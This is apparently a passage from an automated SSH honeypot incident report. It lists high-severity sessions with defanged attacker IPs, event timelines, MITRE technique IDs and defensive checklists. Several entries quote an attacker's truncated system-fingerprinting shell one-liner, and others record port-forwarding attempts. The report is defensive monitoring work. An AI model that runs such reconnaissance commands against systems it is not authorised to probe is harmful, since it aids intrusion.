| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:42:55` | `cowrie.session.connect` |
| `2026-08-16 02:42:55` | `cowrie.client.version` |
| `2026-08-16 02:42:55` | `cowrie.client.kex` |
| `2026-08-16 02:42:56` | `cowrie.login.success` |
| `2026-08-16 02:42:58` | `cowrie.session.params` |
| `2026-08-16 02:42:58` | `cowrie.command.input` |
| `2026-08-16 02:42:58` | `cowrie.command.input` |
| `2026-08-16 02:42:58` | `cowrie.command.input` |
| `2026-08-16 02:42:58` | `cowrie.command.input` |
| `2026-08-16 02:42:58` | `cowrie.command.input` |
| `2026-08-16 02:42:58` | `cowrie.command.success` |
| `2026-08-16 02:42:58` | `cowrie.command.input` |
| `2026-08-16 02:42:58` | `cowrie.command.input` |
| `2026-08-16 02:42:58` | `cowrie.command.input` |
| `2026-08-16 02:42:58` | `cowrie.command.input` |
| `2026-08-16 02:42:58` | `cowrie.log.closed` |
| `2026-08-16 02:42:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fede715df478

| Field | Detail |
|---|---|
| **Source IP** | `154.146.238[.]122` |
| **First Seen** | 2026-08-16 02:43 |
| **Last Seen** | 2026-08-16 02:43 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:43:22` | `cowrie.session.connect` |
| `2026-08-16 02:43:22` | `cowrie.client.version` |
| `2026-08-16 02:43:22` | `cowrie.client.kex` |
| `2026-08-16 02:43:23` | `cowrie.login.success` |
| `2026-08-16 02:43:23` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:43:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `154.146.238[.]122` to AbuseIPDB if not already reported
- [ ] Block `154.146.238[.]122` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a42a48aaa28

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:43 |
| **Last Seen** | 2026-08-16 02:43 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:43:49` | `cowrie.session.connect` |
| `2026-08-16 02:43:49` | `cowrie.client.version` |
| `2026-08-16 02:43:49` | `cowrie.client.kex` |
| `2026-08-16 02:43:50` | `cowrie.login.success` |
| `2026-08-16 02:43:52` | `cowrie.session.params` |
| `2026-08-16 02:43:52` | `cowrie.command.input` |
| `2026-08-16 02:43:52` | `cowrie.command.input` |
| `2026-08-16 02:43:52` | `cowrie.command.input` |
| `2026-08-16 02:43:52` | `cowrie.command.input` |
| `2026-08-16 02:43:52` | `cowrie.command.input` |
| `2026-08-16 02:43:52` | `cowrie.command.success` |
| `2026-08-16 02:43:52` | `cowrie.command.input` |
| `2026-08-16 02:43:52` | `cowrie.command.input` |
| `2026-08-16 02:43:52` | `cowrie.command.input` |
| `2026-08-16 02:43:52` | `cowrie.command.input` |
| `2026-08-16 02:43:53` | `cowrie.log.closed` |
| `2026-08-16 02:43:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3aa6438d7d1b

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:44 |
| **Last Seen** | 2026-08-16 02:44 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:44:44` | `cowrie.session.connect` |
| `2026-08-16 02:44:45` | `cowrie.client.version` |
| `2026-08-16 02:44:45` | `cowrie.client.kex` |
| `2026-08-16 02:44:46` | `cowrie.login.success` |
| `2026-08-16 02:44:47` | `cowrie.session.params` |
| `2026-08-16 02:44:47` | `cowrie.command.input` |
| `2026-08-16 02:44:47` | `cowrie.command.input` |
| `2026-08-16 02:44:47` | `cowrie.command.input` |
| `2026-08-16 02:44:47` | `cowrie.command.input` |
| `2026-08-16 02:44:47` | `cowrie.command.input` |
| `2026-08-16 02:44:47` | `cowrie.command.success` |
| `2026-08-16 02:44:47` | `cowrie.command.input` |
| `2026-08-16 02:44:47` | `cowrie.command.input` |
| `2026-08-16 02:44:47` | `cowrie.command.input` |
| `2026-08-16 02:44:47` | `cowrie.command.input` |
| `2026-08-16 02:44:48` | `cowrie.log.closed` |
| `2026-08-16 02:44:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e20adb5227a1

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:45 |
| **Last Seen** | 2026-08-16 02:45 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:45:39` | `cowrie.session.connect` |
| `2026-08-16 02:45:39` | `cowrie.client.version` |
| `2026-08-16 02:45:40` | `cowrie.client.kex` |
| `2026-08-16 02:45:41` | `cowrie.login.success` |
| `2026-08-16 02:45:42` | `cowrie.session.params` |
| `2026-08-16 02:45:42` | `cowrie.command.input` |
| `2026-08-16 02:45:42` | `cowrie.command.input` |
| `2026-08-16 02:45:42` | `cowrie.command.input` |
| `2026-08-16 02:45:42` | `cowrie.command.input` |
| `2026-08-16 02:45:42` | `cowrie.command.input` |
| `2026-08-16 02:45:42` | `cowrie.command.success` |
| `2026-08-16 02:45:42` | `cowrie.command.input` |
| `2026-08-16 02:45:42` | `cowrie.command.input` |
| `2026-08-16 02:45:42` | `cowrie.command.input` |
| `2026-08-16 02:45:42` | `cowrie.command.input` |
| `2026-08-16 02:45:42` | `cowrie.log.closed` |
| `2026-08-16 02:45:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-16275e091a54

| Field | Detail |
|---|---|
| **Source IP** | `182.60.128[.]241` |
| **First Seen** | 2026-08-16 02:46 |
| **Last Seen** | 2026-08-16 02:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:46:17` | `cowrie.session.connect` |
| `2026-08-16 02:46:18` | `cowrie.client.version` |
| `2026-08-16 02:46:18` | `cowrie.client.kex` |
| `2026-08-16 02:46:20` | `cowrie.login.success` |
| `2026-08-16 02:46:21` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:46:26` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.60.128[.]241` to AbuseIPDB if not already reported
- [ ] Block `182.60.128[.]241` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a2a1a50ee964

| Field | Detail |
|---|---|
| **Source IP** | `60.175.91[.]53` |
| **First Seen** | 2026-08-16 02:46 |
| **Last Seen** | 2026-08-16 02:46 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:46:26` | `cowrie.session.connect` |
| `2026-08-16 02:46:27` | `cowrie.client.version` |
| `2026-08-16 02:46:27` | `cowrie.client.kex` |
| `2026-08-16 02:46:30` | `cowrie.login.success` |
| `2026-08-16 02:46:30` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:46:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `60.175.91[.]53` to AbuseIPDB if not already reported
- [ ] Block `60.175.91[.]53` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eec30b88d238

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:46 |
| **Last Seen** | 2026-08-16 02:46 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:46:33` | `cowrie.session.connect` |
| `2026-08-16 02:46:34` | `cowrie.client.version` |
| `2026-08-16 02:46:34` | `cowrie.client.kex` |
| `2026-08-16 02:46:35` | `cowrie.login.success` |
| `2026-08-16 02:46:36` | `cowrie.session.params` |
| `2026-08-16 02:46:36` | `cowrie.command.input` |
| `2026-08-16 02:46:36` | `cowrie.command.input` |
| `2026-08-16 02:46:36` | `cowrie.command.input` |
| `2026-08-16 02:46:36` | `cowrie.command.input` |
| `2026-08-16 02:46:36` | `cowrie.command.input` |
| `2026-08-16 02:46:36` | `cowrie.command.success` |
| `2026-08-16 02:46:36` | `cowrie.command.input` |
| `2026-08-16 02:46:36` | `cowrie.command.input` |
| `2026-08-16 02:46:36` | `cowrie.command.input` |
| `2026-08-16 02:46:36` | `cowrie.command.input` |
| `2026-08-16 02:46:37` | `cowrie.log.closed` |
| `2026-08-16 02:46:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e30b3fb0c341

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:47 |
| **Last Seen** | 2026-08-16 02:47 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:47:28` | `cowrie.session.connect` |
| `2026-08-16 02:47:29` | `cowrie.client.version` |
| `2026-08-16 02:47:29` | `cowrie.client.kex` |
| `2026-08-16 02:47:29` | `cowrie.login.success` |
| `2026-08-16 02:47:30` | `cowrie.session.params` |
| `2026-08-16 02:47:30` | `cowrie.command.input` |
| `2026-08-16 02:47:30` | `cowrie.command.input` |
| `2026-08-16 02:47:30` | `cowrie.command.input` |
| `2026-08-16 02:47:30` | `cowrie.command.input` |
| `2026-08-16 02:47:30` | `cowrie.command.input` |
| `2026-08-16 02:47:30` | `cowrie.command.success` |
| `2026-08-16 02:47:30` | `cowrie.command.input` |
| `2026-08-16 02:47:30` | `cowrie.command.input` |
| `2026-08-16 02:47:30` | `cowrie.command.input` |
| `2026-08-16 02:47:30` | `cowrie.command.input` |
| `2026-08-16 02:47:31` | `cowrie.log.closed` |
| `2026-08-16 02:47:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7cc03229bed5

| Field | Detail |
|---|---|
| **Source IP** | `122.176.45[.]238` |
| **First Seen** | 2026-08-16 02:48 |
| **Last Seen** | 2026-08-16 02:48 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:48:14` | `cowrie.session.connect` |
| `2026-08-16 02:48:15` | `cowrie.client.version` |
| `2026-08-16 02:48:15` | `cowrie.client.kex` |
| `2026-08-16 02:48:17` | `cowrie.login.success` |
| `2026-08-16 02:48:17` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:48:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `122.176.45[.]238` to AbuseIPDB if not already reported
- [ ] Block `122.176.45[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f50de75ab42f

| Field | Detail |
|---|---|
| **Source IP** | `178.178.194[.]134` |
| **First Seen** | 2026-08-16 02:48 |
| **Last Seen** | 2026-08-16 02:48 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:48:23` | `cowrie.session.connect` |
| `2026-08-16 02:48:23` | `cowrie.client.version` |
| `2026-08-16 02:48:23` | `cowrie.client.kex` |
| `2026-08-16 02:48:24` | `cowrie.login.success` |
| `2026-08-16 02:48:25` | `cowrie.direct-tcpip.request` |
| `2026-08-16 02:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `178.178.194[.]134` to AbuseIPDB if not already reported
- [ ] Block `178.178.194[.]134` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-672460192083

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:48 |
| **Last Seen** | 2026-08-16 02:48 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:48:25` | `cowrie.session.connect` |
| `2026-08-16 02:48:26` | `cowrie.client.version` |
| `2026-08-16 02:48:26` | `cowrie.client.kex` |
| `2026-08-16 02:48:27` | `cowrie.login.success` |
| `2026-08-16 02:48:28` | `cowrie.session.params` |
| `2026-08-16 02:48:28` | `cowrie.command.input` |
| `2026-08-16 02:48:28` | `cowrie.command.input` |
| `2026-08-16 02:48:28` | `cowrie.command.input` |
| `2026-08-16 02:48:28` | `cowrie.command.input` |
| `2026-08-16 02:48:28` | `cowrie.command.input` |
| `2026-08-16 02:48:28` | `cowrie.command.success` |
| `2026-08-16 02:48:28` | `cowrie.command.input` |
| `2026-08-16 02:48:28` | `cowrie.command.input` |
| `2026-08-16 02:48:28` | `cowrie.command.input` |
| `2026-08-16 02:48:28` | `cowrie.command.input` |
| `2026-08-16 02:48:29` | `cowrie.log.closed` |
| `2026-08-16 02:48:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-32ba0a83f593

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:49 |
| **Last Seen** | 2026-08-16 02:49 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:49:20` | `cowrie.session.connect` |
| `2026-08-16 02:49:21` | `cowrie.client.version` |
| `2026-08-16 02:49:21` | `cowrie.client.kex` |
| `2026-08-16 02:49:22` | `cowrie.login.success` |
| `2026-08-16 02:49:24` | `cowrie.session.params` |
| `2026-08-16 02:49:24` | `cowrie.command.input` |
| `2026-08-16 02:49:24` | `cowrie.command.input` |
| `2026-08-16 02:49:24` | `cowrie.command.input` |
| `2026-08-16 02:49:24` | `cowrie.command.input` |
| `2026-08-16 02:49:24` | `cowrie.command.input` |
| `2026-08-16 02:49:24` | `cowrie.command.success` |
| `2026-08-16 02:49:24` | `cowrie.command.input` |
| `2026-08-16 02:49:24` | `cowrie.command.input` |
| `2026-08-16 02:49:24` | `cowrie.command.input` |
| `2026-08-16 02:49:24` | `cowrie.command.input` |
| `2026-08-16 02:49:24` | `cowrie.log.closed` |
| `2026-08-16 02:49:25` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-59e078838888

| Field | Detail |
|---|---|
| **Source IP** | `45.142.193[.]164` |
| **First Seen** | 2026-08-16 02:49 |
| **Last Seen** | 2026-08-16 02:50 |
| **Session Duration** | 47s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo xsec` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:49:43` | `cowrie.session.connect` |
| `2026-08-16 02:49:48` | `cowrie.client.version` |
| `2026-08-16 02:49:48` | `cowrie.client.kex` |
| `2026-08-16 02:50:11` | `cowrie.login.success` |
| `2026-08-16 02:50:25` | `cowrie.session.params` |
| `2026-08-16 02:50:25` | `cowrie.command.input` |
| `2026-08-16 02:50:30` | `cowrie.log.closed` |
| `2026-08-16 02:50:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.142.193[.]164` to AbuseIPDB if not already reported
- [ ] Block `45.142.193[.]164` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bff897782992

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:50 |
| **Last Seen** | 2026-08-16 02:50 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:$PATH; uname=$(uname -s -v -n -m 2>/dev/null || /bin/uname -s -v -n -m 2>/dev/null || /usr/bin/uname -s -v -n -m 2>/dev/null || busybox uname -s -v -n -m 2>/dev/null || ( [ -f /proc/version ] && head -1 /proc/version | cut -d' ' -f1 ) || ( [ -f /etc/os-release ] && grep '^ID=' /etc/os-release | cut -d= -f2 | tr -d '"' ) || echo ""); arch=$(uname -m 2>/dev/null || /bin/uname -m 2>/dev/null || /usr/bin/uname -m 2>/dev/null || busybox una, uname -s -v -n -m 2 > /dev/null, /bin/uname -s -v -n -m 2 > /dev/null, /usr/bin/uname -s -v -n -m 2 > /dev/null, busybox uname -s -v -n -m 2 > /dev/null` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1083 · T1222.002 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-08-16 02:50:16` | `cowrie.session.connect` |
| `2026-08-16 02:50:17` | `cowrie.client.version` |
| `2026-08-16 02:50:17` | `cowrie.client.kex` |
| `2026-08-16 02:50:18` | `cowrie.login.success` |
| `2026-08-16 02:50:20` | `cowrie.session.params` |
| `2026-08-16 02:50:20` | `cowrie.command.input` |
| `2026-08-16 02:50:20` | `cowrie.command.input` |
| `2026-08-16 02:50:20` | `cowrie.command.input` |
| `2026-08-16 02:50:20` | `cowrie.command.input` |
| `2026-08-16 02:50:20` | `cowrie.command.input` |
| `2026-08-16 02:50:20` | `cowrie.command.success` |
| `2026-08-16 02:50:20` | `cowrie.command.input` |
| `2026-08-16 02:50:20` | `cowrie.command.input` |
| `2026-08-16 02:50:20` | `cowrie.command.input` |
| `2026-08-16 02:50:20` | `cowrie.command.input` |
| `2026-08-16 02:50:21` | `cowrie.log.closed` |
| `2026-08-16 02:50:22` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `193.32.162[.]15` to AbuseIPDB if not already reported
- [ ] Block `193.32.162[.]15` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a432dbb7ac78

| Field | Detail |
|---|---|
| **Source IP** | `193.32.162[.]15` |
| **First Seen** | 2026-08-16 02:51 |
| **Last Seen** | 2026-08-16 02:51 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
